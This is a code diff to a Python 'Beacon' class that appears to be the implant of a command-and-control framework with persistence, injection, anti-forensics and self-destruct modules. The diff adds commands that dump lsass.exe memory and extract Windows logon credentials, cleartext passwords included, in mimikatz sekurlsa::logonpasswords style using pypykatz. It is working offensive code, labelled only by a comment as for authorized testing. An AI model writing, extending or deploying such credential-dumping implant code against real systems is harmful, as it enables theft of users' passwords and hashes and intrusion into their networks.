@@ -252,6 +252,7 @@ class Beacon:
             # stand-alone fallback: injected modules on class
             attr = {"persistence": "_mod_persist", "injection": "_mod_inject",
                     "antiforensics": "_mod_af", "obfuscation": "_mod_obf",
+                    "lsass": "_mod_lsass",
                     "crypto": "_mod_crypto"}.get(modname)
             if attr:
                 return getattr(self, attr, None)
@@ -318,6 +319,69 @@ class Beacon:
         path = args.strip() or None
         removed = mod.self_destruct(path)
         return True, "removed: " + (", ".join(removed) if removed else "nothing; file may be in use")
+
+    # --- LSASS dump (Windows; admin / SeDebugPrivilege required) ---
+    # AUTHORIZED SECURITY TESTING ONLY. Produces a minidump of lsass.exe
+    # that can be parsed off-target with pypykatz. See cs/modules/lsass.py.
+    def do_lsass(self, args):
+        parts = args.split()
+        if not parts:
+            return False, "lsass <out_path> [comsvcs|ctypes]"
+        out = parts[0]
+        prefer = parts[1] if len(parts) > 1 else "comsvcs"
+        mod = self._load_import("lsass")
+        if mod is None:
+            return False, "lsass module unavailable"
+        ok, msg = mod.dump_lsass(out, prefer=prefer)
+        return ok, msg
+
+    def do_lsass_parse(self, args):
+        path = args.strip()
+        if not path:
+            return False, "lsass-parse <dump_path>"
+        mod = self._load_import("lsass")
+        if mod is None:
+            return False, "lsass module unavailable"
+        return mod.parse_dump(path)
+
+    def do_sekurlsa(self, args):
+        """sekurlsa::logonpasswords -- live LSASS parsing via pypykatz.
+
+        Usage (beacon side):
+          sekurlsa                          # all packages, default lsass.exe
+          sekurlsa --pkgs msv,wdigest       # subset
+          sekurlsa --pid 1234               # explicit PID
+          sekurlsa --no-lsa                 # skip LSA step (faster, no cleartext)
+
+        Returns a long text report (mimikatz sekurlsa::logonpasswords style).
+        """
+        parts = args.split()
+        pkgs = "all"
+        pid = None
+        no_lsa = False
+        i = 0
+        while i < len(parts):
+            t = parts[i]
+            if t in ("--pkgs", "--packages") and i + 1 < len(parts):
+                pkgs = parts[i + 1]
+                i += 2
+            elif t == "--pid" and i + 1 < len(parts):
+                pid = parts[i + 1]
+                i += 2
+            elif t == "--no-lsa":
+                no_lsa = True
+                i += 1
+            elif t in ("--help", "-h"):
+                return True, ("usage: sekurlsa [--pkgs msv,wdigest,...] "
+                              "[--pid <pid>] [--no-lsa]")
+            else:
+                # positional: treat as packages list (legacy form)
+                pkgs = t
+                i += 1
+        mod = self._load_import("lsass")
+        if mod is None:
+            return False, "lsass module unavailable"
+        return mod.sekurlsa_logonpasswords(packages=pkgs, pid=pid, no_lsa=no_lsa)
 
     # ---------- Main loop ----------
     def start(self):
